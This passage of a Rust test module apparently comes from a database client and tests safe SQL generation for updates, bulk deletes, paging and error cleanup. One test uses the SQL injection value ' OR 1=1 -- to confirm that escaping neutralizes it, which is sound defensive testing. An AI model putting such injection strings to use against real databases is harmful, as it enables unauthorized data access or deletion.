        assert!(delete_row_sql(DbEngine::MySql, "s", "t", &[]).is_err());
    }

    #[test]
    fn an_edit_is_qualified_and_limited() {
        let sql = update_cell_sql(
            DbEngine::MySql,
            "shop",
            "orders",
            "status",
            Some("paid"),
            &[("id".into(), Some("42".into()))],
        )
        .unwrap();
        assert_eq!(
            sql,
            "UPDATE `shop`.`orders` SET `status` = 'paid' WHERE `id` = '42' LIMIT 1"
        );
    }

    #[test]
    fn bulk_delete_is_one_statement_per_selection() {
        let keys = vec![
            vec![("id".to_string(), Some("1".to_string()))],
            vec![("id".to_string(), Some("2".to_string()))],
        ];
        let sql = delete_rows_sql(DbEngine::MySql, "shop", "orders", &keys).unwrap();
        assert_eq!(
            sql,
            "DELETE FROM `shop`.`orders` WHERE (`id` = '1') OR (`id` = '2')"
        );
        // No LIMIT: it must delete exactly the selected rows, not the first N of them.
        assert!(!sql.contains("LIMIT"), "{sql}");
    }

    #[test]
    fn bulk_delete_handles_composite_keys_and_postgres_quoting() {
        let keys = vec![vec![
            ("tenant".to_string(), Some("a".to_string())),
            ("id".to_string(), None),
        ]];
        let sql = delete_rows_sql(DbEngine::Postgres, "public", "Item", &keys).unwrap();
        assert_eq!(
            sql,
            "DELETE FROM \"Item\" WHERE (\"tenant\" = 'a' AND \"id\" IS NULL)"
        );
    }

    #[test]
    fn bulk_delete_refuses_the_dangerous_cases() {
        // Nothing selected must never become an unqualified DELETE.
        assert!(delete_rows_sql(DbEngine::MySql, "s", "t", &[]).is_err());
        // A keyless table can't identify rows, so it must refuse rather than guess.
        let keyless = vec![vec![]];
        assert!(delete_rows_sql(DbEngine::MySql, "s", "t", &keyless).is_err());
        // And an absurd selection is capped rather than building a giant statement.
        let many: Vec<Vec<(String, Option<String>)>> = (0..MAX_BULK_DELETE + 1)
            .map(|i| vec![("id".to_string(), Some(i.to_string()))])
            .collect();
        let err = delete_rows_sql(DbEngine::MySql, "s", "t", &many).unwrap_err();
        assert!(err.contains("at a time"), "{err}");
    }

    #[test]
    fn bulk_delete_escapes_values_in_every_disjunct() {
        let keys = vec![
            vec![("id".to_string(), Some("' OR 1=1 --".to_string()))],
            vec![("id".to_string(), Some("2".to_string()))],
        ];
        let sql = delete_rows_sql(DbEngine::MySql, "s", "t", &keys).unwrap();
        // The payload stays inside the literal; it cannot widen the WHERE clause.
        assert!(sql.contains("`id` = ''' OR 1=1 --'"), "{sql}");
    }

    #[test]
    fn a_null_key_part_uses_is_null() {
        let sql = delete_row_sql(DbEngine::MySql, "s", "t", &[("a".into(), None), ("b".into(), Some("1".into()))])
            .unwrap();
        assert!(sql.contains("`a` IS NULL AND `b` = '1'"), "{sql}");
    }

    #[test]
    fn page_size_is_clamped() {
        assert!(select_page_sql(DbEngine::MySql, "s", "t", 0, 0).unwrap().contains("LIMIT 1 "));
        assert!(select_page_sql(DbEngine::MySql, "s", "t", 99_999, 0).unwrap().contains("LIMIT 5000 "));
    }

    #[test]
    fn strips_the_password_warning_from_errors() {
        let text = "mysql: [Warning] Using a password on the command line interface can be insecure.\nERROR 1146 (42S02): Table 'x.y' doesn't exist";
        let cleaned = clean_error(text);
        assert!(!cleaned.contains("Warning"), "{cleaned}");
        assert!(cleaned.contains("1146"), "{cleaned}");
    }
}
